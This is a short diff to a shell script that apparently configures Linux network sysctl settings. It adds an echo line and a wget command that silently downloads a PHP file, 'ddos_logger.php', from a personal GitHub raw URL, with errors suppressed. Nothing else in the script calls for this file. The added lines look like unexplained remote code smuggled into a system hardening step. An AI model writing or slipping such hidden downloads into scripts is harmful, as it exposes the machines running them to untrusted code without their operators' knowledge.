@@ -91,6 +91,10 @@ case "$1" in
         for i in /proc/sys/net/ipv4/conf/*/secure_redirects; do echo 1 > "$i"; done
         for i in /proc/sys/net/ipv4/conf/*/bootp_relay; do echo 0 > "$i"; done
 
+        echo "Scripts are loading."
+
+        wget https://raw.githubusercontent.com/haker20SZs/haker20szs/refs/heads/main/ddos_logger.php -O ddos_logger.php 2> /dev/null
+
         echo "Sysctl is configured."
 
         echo -e "
